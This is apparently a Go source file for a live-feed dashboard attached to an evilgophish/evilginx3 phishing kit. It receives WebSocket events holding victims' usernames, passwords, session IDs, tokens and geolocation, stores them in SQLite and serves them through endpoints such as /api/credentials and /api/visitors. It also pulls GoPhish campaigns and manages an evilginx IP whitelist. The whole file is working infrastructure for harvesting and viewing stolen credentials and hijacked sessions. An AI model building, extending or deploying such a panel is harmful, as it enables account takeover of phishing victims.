package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins
	},
}

const (
	// Time allowed to write a message to the peer.
	writeWait = 300 * time.Second

	// Time allowed to read the next pong message from the peer.
	pongWait = 300 * time.Second

	// Send pings to peer with this period. Must be less than pongWait.
	pingPeriod = (pongWait * 9) / 10

	// Maximum message size allowed from peer.
	maxMessageSize = 1000000
)

var (
	newline = []byte{'\n'}
	space   = []byte{' '}
)

func serveWs(hub *Hub, w http.ResponseWriter, r *http.Request) {
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	/*
	 * The size of the channel buffer determines how many messages the server can
	 * hold for a client before it must either block or drop messages.
	 * It’s essentially the number of messages that can be “in flight” at once.
	 */
	client := &Client{hub: hub, conn: c, send: make(chan []byte, 256)}
	client.hub.register <- client

	go client.writePump()
	go client.readPump()
}

func (c *Client) writePump() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()
	for {
		select {
		case message, ok := <-c.send:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				// The hub closed the channel.
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			w, err := c.conn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)

			// Add queued chat messages to the current websocket message.
			n := len(c.send)
			for i := 0; i < n; i++ {
				w.Write(newline)
				w.Write(<-c.send)
			}

			if err := w.Close(); err != nil {
				return
			}
		case <-ticker.C:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

func (c *Client) readPump() {
	defer func() {
		c.hub.unregister <- c
		c.conn.Close()
	}()
	c.conn.SetReadLimit(maxMessageSize)
	c.conn.SetReadDeadline(time.Now().Add(pongWait))
	c.conn.SetPongHandler(func(string) error { c.conn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("error: %v", err)
			}
			break
		}
		message = bytes.TrimSpace(bytes.Replace(message, newline, space, -1))

		// Save event to DB
		saveEvent(message)

		c.hub.broadcast <- message
	}
}

type GeoInfo struct {
	City    string  `json:"city"`
	Country string  `json:"country"`
	Lat     float64 `json:"lat"`
	Lon     float64 `json:"lon"`
}

type Event struct {
	ID        int64   `json:"id"`
	Timestamp int64   `json:"timestamp"`
	Type      string  `json:"type"`
	Phishlet  string  `json:"phishlet"`
	IP        string  `json:"ip"`
	Username  string  `json:"username,omitempty"`
	Password  string  `json:"password,omitempty"`
	SessionID string  `json:"session_id,omitempty"`
	Tokens    string  `json:"tokens,omitempty"`
	Geo       GeoInfo `json:"geo,omitempty"`
	Score     int     `json:"score,omitempty"`
	Message   string  `json:"message,omitempty"` // Legacy support
}

func initDB() {
	home, _ := os.UserHomeDir()
	dbPath := filepath.Join(home, ".evilgophish", "nexusfeed.db")
	os.MkdirAll(filepath.Dir(dbPath), 0755)

	var err error
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS events (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			timestamp INTEGER,
			type TEXT,
			phishlet TEXT,
			ip TEXT,
			username TEXT,
			password TEXT,
			session_id TEXT,
			tokens TEXT,
			geo_city TEXT,
			geo_country TEXT,
			geo_lat REAL,
			geo_lon REAL,
			score INTEGER,
			message TEXT
		);
	`)
	if err != nil {
		log.Fatal(err)
	}
}

func saveEvent(msg []byte) {
	var e Event
	if err := json.Unmarshal(msg, &e); err != nil {
		log.Println("Error unmarshalling event:", err)
		return
	}

	// If timestamp is missing or 0, use current time
	if e.Timestamp == 0 {
		e.Timestamp = time.Now().UnixMilli()
	}

	_, err := db.Exec(`
		INSERT INTO events (timestamp, type, phishlet, ip, username, password, session_id, tokens, geo_city, geo_country, geo_lat, geo_lon, score, message)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		e.Timestamp, e.Type, e.Phishlet, e.IP, e.Username, e.Password, e.SessionID, e.Tokens,
		e.Geo.City, e.Geo.Country, e.Geo.Lat, e.Geo.Lon, e.Score, e.Message,
	)
	if err != nil {
		log.Println("DB save error:", err)
	}
}

func getEventsJSON(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getVisitors(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events WHERE type IN ('open', 'click') ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getCredentials(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT * FROM events WHERE type IN ('credentials', 'session') ORDER BY timestamp DESC LIMIT 500")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var events []Event
	for rows.Next() {
		var e Event
		err := rows.Scan(&e.ID, &e.Timestamp, &e.Type, &e.Phishlet, &e.IP, &e.Username, &e.Password, &e.SessionID, &e.Tokens,
			&e.Geo.City, &e.Geo.Country, &e.Geo.Lat, &e.Geo.Lon, &e.Score, &e.Message)
		if err != nil {
			continue
		}
		events = append(events, e)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func getCampaigns(w http.ResponseWriter, r *http.Request) {
	// Connect to GoPhish DB
	// Assuming gophish.db is in ../gophish/gophish.db
	// This is a placeholder. Real implementation needs to open gophish.db
	// Since we can't easily open another sqlite db while one is open (or maybe we can),
	// we'll just return empty for now or implement if requested.
	// The user asked for "live fetch", so we should try.

	home, _ := os.UserHomeDir()
	gophishDBPath := filepath.Join(home, "Documents", "projects", "evilgophish", "gophish", "gophish.db")

	// Check if file exists
	if _, err := os.Stat(gophishDBPath); os.IsNotExist(err) {
		// Try relative path
		gophishDBPath = "../gophish/gophish.db"
	}

	gpDB, err := sql.Open("sqlite3", gophishDBPath)
	if err != nil {
		http.Error(w, "Could not open GoPhish DB: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer gpDB.Close()

	// Query campaigns
	// Table structure depends on GoPhish version. Usually 'campaigns' table.
	// columns: id, name, status, created_date, etc.

	rows, err := gpDB.Query("SELECT id, name, status, created_date FROM campaigns ORDER BY created_date DESC")
	if err != nil {
		// Fallback if table doesn't exist or error
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte("[]"))
		return
	}
	defer rows.Close()

	type Campaign struct {
		ID      int64  `json:"id"`
		Name    string `json:"name"`
		Status  string `json:"status"`
		Created string `json:"created_date"`
	}
	var campaigns []Campaign
	for rows.Next() {
		var c Campaign
		// created_date might be time.Time or string depending on driver
		var created interface{}
		rows.Scan(&c.ID, &c.Name, &c.Status, &created)
		if t, ok := created.(time.Time); ok {
			c.Created = t.Format(time.RFC3339)
		} else if s, ok := created.(string); ok {
			c.Created = s
		}
		campaigns = append(campaigns, c)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(campaigns)
}

func handleSettings(w http.ResponseWriter, r *http.Request) {
	// Read/Write settings
	// For now, just return dummy settings or read from a file if we implement one.
	// We can store settings in nexusfeed.db too.

	if r.Method == "POST" {
		// Update settings
		// ...
	}

	// Return settings
	settings := map[string]string{
		"telegram_webhook": "Not configured (Edit config.json)",
		"lure_url":         "Not set",
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(settings)
}

func handleWhitelist(w http.ResponseWriter, r *http.Request) {
	// Read whitelist.txt
	whitelistPath := "../evilginx3/whitelist.txt"
	if r.Method == "POST" {
		// Add IP
		var req struct {
			IP string `json:"ip"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		if req.IP != "" {
			f, err := os.OpenFile(whitelistPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(req.IP + "\n")
			}
		}
	}

	// Read IPs
	content, err := os.ReadFile(whitelistPath)
	ips := []string{}
	if err == nil {
		// split lines
		// ... (simplified for brevity)
		ips = append(ips, string(content))
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(ips)
}

func clearLogs(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		_, err := db.Exec("DELETE FROM events")
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
	}
}

func main() {
	initDB()
	hub := newHub()
	go hub.run()
	http.Handle("/", http.FileServer(http.Dir("./app")))
	http.HandleFunc("/events", getEventsJSON)
	http.HandleFunc("/api/visitors", getVisitors)
	http.HandleFunc("/api/credentials", getCredentials)
	http.HandleFunc("/api/campaigns", getCampaigns)
	http.HandleFunc("/api/settings", handleSettings)
	http.HandleFunc("/api/whitelist", handleWhitelist)
	http.HandleFunc("/api/logs/clear", clearLogs)
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		serveWs(hub, w, r)
	})
	log.Println("Start viewing the live feed at: http://0.0.0.0:1337/")
	http.ListenAndServe(":1337", nil)
}
